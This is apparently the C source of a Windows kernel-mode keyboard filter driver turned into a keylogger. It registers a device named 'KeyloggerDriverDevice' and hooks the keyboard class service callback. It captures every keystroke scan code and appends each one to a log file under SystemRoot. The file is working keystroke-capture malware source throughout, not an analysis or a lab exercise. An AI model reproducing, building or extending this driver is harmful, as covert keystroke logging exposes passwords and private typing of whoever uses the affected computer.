#include "Filter.h"



#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, FilterEvtDeviceAdd)
#endif


NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING RegistryPath
)
{
    WDF_DRIVER_CONFIG   config;
    NTSTATUS            status;
    WDFDRIVER           hDriver;

    KdPrint(("Keyboard filter: DriverEntry\n"));

    //
    // Initialize driver config to control the attributes that
    // are global to the driver. Note that framework by default
    // provides a driver unload routine. If you create any resources
    // in the DriverEntry and want to be cleaned in driver unload,
    // you can override that by manually setting the EvtDriverUnload in the
    // config structure. In general xxx_CONFIG_INIT macros are provided to
    // initialize most commonly used members.
    //

    WDF_DRIVER_CONFIG_INIT(
        &config,
        FilterEvtDeviceAdd
    );

    //
    // Create a framework driver object to represent our driver.
    //
    status = WdfDriverCreate(DriverObject,
        RegistryPath,
        WDF_NO_OBJECT_ATTRIBUTES,
        &config,
        &hDriver);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDriverCreate failed with status 0x%x\n", status));
    }

    return status;
}


NTSTATUS
FilterEvtDeviceAdd(
    IN WDFDRIVER        Driver,
    IN PWDFDEVICE_INIT  DeviceInit
)
{
    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    PFILTER_EXTENSION       filterExt;
    NTSTATUS                status;
    WDFDEVICE               device;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;

    KdPrint(("Keyboard filter: FilterEvtDeviceAdd\n"));

    PAGED_CODE();

    UNREFERENCED_PARAMETER(Driver);

    //
    // Tell the framework that you are filter driver. Framework
    // takes care of inherting all the device flags & characterstics
    // from the lower device you are attaching to.
    //
    WdfFdoInitSetFilter(DeviceInit);

    //
    // Specify the size of device extension where we track per device
    // context.
    //

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, FILTER_EXTENSION);

    DECLARE_CONST_UNICODE_STRING(MyDeviceName, L"\\Device\\KeyloggerDriverDevice");
    status = WdfDeviceInitAssignName(
        DeviceInit,
        &MyDeviceName
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDeviceInitAssignName failed with status code 0x%x\n", status));
        return status;
    }
    //
    // Create a framework device object.This call will inturn create
    // a WDM deviceobject, attach to the lower stack and set the
    // appropriate flags and attributes.
    //
    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &device);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDeviceCreate failed with status code 0x%x\n", status));
        return status;
    }

    filterExt = FilterGetData(device);

    //
    // Configure the default queue to be Parallel. Do not use sequential queue
    // if this driver is going to be filtering PS2 ports because it can lead to
    // deadlock. The PS2 port driver sends a request to the top of the stack when it
    // receives an ioctl request and waits for it to be completed. If you use a
    // a sequential queue, this request will be stuck in the queue because of the 
    // outstanding ioctl request sent earlier to the port driver.
    //
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchParallel);

    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    ioQueueConfig.EvtIoInternalDeviceControl = FilterEvtIoInternalDeviceControl;

    status = WdfIoQueueCreate(device,
        &ioQueueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE // pointer to default queue
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

    return status;
}

VOID
FilterEvtIoInternalDeviceControl(
    IN WDFQUEUE      Queue,
    IN WDFREQUEST    Request,
    IN size_t        OutputBufferLength,
    IN size_t        InputBufferLength,
    IN ULONG         IoControlCode
)
{
    PFILTER_EXTENSION               filterExt;
    NTSTATUS                        status = STATUS_SUCCESS;
    WDFDEVICE                       device;
    PCONNECT_DATA                   connectData = NULL;
    size_t                          length;


    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);

    PAGED_CODE();

    KdPrint(("Keyboard filter: EvtIoInternalDeviceControl\n"));

    device = WdfIoQueueGetDevice(Queue);

    filterExt = FilterGetData(device);

    switch (IoControlCode) {

        //
        // Connect a keyboard class device driver to the port driver.
        //
        case IOCTL_INTERNAL_KEYBOARD_CONNECT:
            //
            // Only allow one connection.
            //
            if (filterExt->UpperConnectData.ClassService != NULL) {
                status = STATUS_SHARING_VIOLATION;
                break;
            }

            //
            // Get the input buffer from the request
            // (Parameters.DeviceIoControl.Type3InputBuffer).
            //
            status = WdfRequestRetrieveInputBuffer(Request,
                sizeof(CONNECT_DATA),
                &connectData,
                &length);
            if (!NT_SUCCESS(status)) {
                KdPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
                break;
            }

            NT_ASSERT(length == InputBufferLength);

            filterExt->UpperConnectData = *connectData;
            
            ExInitializeFastMutex(&filterExt->FastMutex);

            //
            // Hook into the report chain.  Everytime a keyboard packet is reported
            // to the system, KbFilter_ServiceCallback will be called
            //
            connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);

    #pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

            connectData->ClassService = FilterServiceCallback;

    #pragma warning(default:4152)

            break;
        default:
            break;
    }

    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;
    }

    //
    // Forward the request down. WdfDeviceGetIoTarget returns
    // the default target, which represents the device attached to us below in
    // the stack.
    //
#if FORWARD_REQUEST_WITH_COMPLETION
    //
    // Use this routine to forward a request if you are interested in post
    // processing the IRP.
    //
    FilterForwardRequestWithCompletionRoutine(Request,
        WdfDeviceGetIoTarget(device));
#else   
    FilterForwardRequest(Request, WdfDeviceGetIoTarget(device));
#endif

    return;
}

VOID
FilterServiceCallback(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
)
{
    PFILTER_EXTENSION   filterExt;
    WDFDEVICE           device;

    KdPrint(("Keyboard filter: FilterServiceCallback\n"));
    KdPrint(("MakeCode: 0x%hx\n", InputDataStart->MakeCode));

    device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

    filterExt = FilterGetData(device);

    PWORKER_DATA data = (PWORKER_DATA)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(WORKER_DATA), 0x64657246);
    if (data) {
        data->Item = IoAllocateWorkItem(DeviceObject);
        USHORT ScanCode = InputDataStart->MakeCode;
        ScanCode &= 0x00FF;
        if (InputDataStart->Flags & KEY_BREAK) {
            ScanCode |= 0x0080;
        }
        if ((InputDataStart->Flags & KEY_E0) != 0) {
            ScanCode |= 0xE000;
        }
        if ((InputDataStart->Flags & KEY_E1) != 0) {
            ScanCode |= 0xE100;
        }

        data->ScanCode = ScanCode;
        data->FastMutex = &filterExt->FastMutex;
        IoQueueWorkItem(data->Item, WriteMakeCodeToFile, NormalWorkQueue, data);
    }
    else {
        KdPrint(("Could not allocate memory with ExAllocatePool2"));
    }


    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)filterExt->UpperConnectData.ClassService)(
        filterExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}


VOID
FilterForwardRequest(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
)
{
    WDF_REQUEST_SEND_OPTIONS options;
    BOOLEAN ret;
    NTSTATUS status;

    //
    // We are not interested in post processing the IRP so 
    // fire and forget.
    //
    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    ret = WdfRequestSend(Request, Target, &options);

    if (ret == FALSE) {
        status = WdfRequestGetStatus(Request);
        KdPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }
    return;
}

VOID WriteMakeCodeToFile(IN PDEVICE_OBJECT DeviceObject, IN PWORKER_DATA Context) {
    PAGED_CODE();

    KdPrint(("IRQLWorker: %hu\n", KeGetCurrentIrql()));
    
    // File handling
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS ntstatus = STATUS_SUCCESS;
    UNICODE_STRING uc;
    RtlInitUnicodeString(&uc, L"\\SystemRoot\\LOGGER\\logs");

    USHORT ScanCode = Context->ScanCode;
    UCHAR     buffer[2];
    buffer[0] = (ScanCode & 255);
    KdPrint(("Buffer[0]: 0x%x\n", (int) buffer[0]));
    buffer[1] = (ScanCode >> 8);
    KdPrint(("Buffer[1]: 0x%x\n", (int)buffer[1]));
    size_t  cb = 2;

    ExAcquireFastMutex(Context->FastMutex);
    KdPrint(("AcquiredFastMutex\n"));

    InitializeObjectAttributes(&objAttr, 
        &uc,
        OBJ_KERNEL_HANDLE,
        NULL, 
        NULL);

    ntstatus = ZwCreateFile(&fileHandle,
        FILE_APPEND_DATA,
        &objAttr, &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    if (!NT_SUCCESS(ntstatus)) {
        KdPrint(("ZwCreateFile failed\n"));
        KdPrint(("ReleasingFastMutex\n"));
        ExReleaseFastMutex(Context->FastMutex);
        return;
    }

    KdPrint(("Opened file: %wZ\n", uc));

    #pragma warning(disable:4267)  //size_t to ULONG cast
    ntstatus = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock,
        buffer, cb, NULL, NULL);
    #pragma warning(default:4267)  
    if (!NT_SUCCESS(ntstatus)) {
        KdPrint(("Couldn't write to file\n"));
    }

    ZwClose(fileHandle);
    KdPrint(("ReleasingFastMutex\n"));
    ExReleaseFastMutex(Context->FastMutex);
    
    UNREFERENCED_PARAMETER(DeviceObject);
    IoFreeWorkItem(Context->Item);
    ExFreePool(Context);
}

#if FORWARD_REQUEST_WITH_COMPLETION

VOID
FilterForwardRequestWithCompletionRoutine(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
)
/*++
Routine Description:

    This routine forwards the request to a lower driver with
    a completion so that when the request is completed by the
    lower driver, it can regain control of the request and look
    at the result.

--*/
{
    BOOLEAN ret;
    NTSTATUS status;

    //
    // The following funciton essentially copies the content of
    // current stack location of the underlying IRP to the next one. 
    //
    WdfRequestFormatRequestUsingCurrentType(Request);

    WdfRequestSetCompletionRoutine(Request,
        FilterRequestCompletionRoutine,
        WDF_NO_CONTEXT);

    ret = WdfRequestSend(Request,
        Target,
        WDF_NO_SEND_OPTIONS);

    if (ret == FALSE) {
        status = WdfRequestGetStatus(Request);
        KdPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }

    return;
}

VOID
FilterRequestCompletionRoutine(
    IN WDFREQUEST                  Request,
    IN WDFIOTARGET                 Target,
    PWDF_REQUEST_COMPLETION_PARAMS CompletionParams,
    IN WDFCONTEXT                  Context
)
/*++

Routine Description:

    Completion Routine

Arguments:

    Target - Target handle
    Request - Request handle
    Params - request completion params
    Context - Driver supplied context


Return Value:

    VOID

--*/
{
    UNREFERENCED_PARAMETER(Target);
    UNREFERENCED_PARAMETER(Context);

    WdfRequestComplete(Request, CompletionParams->IoStatus.Status);

    return;
}

#endif //FORWARD_REQUEST_WITH_COMPLETION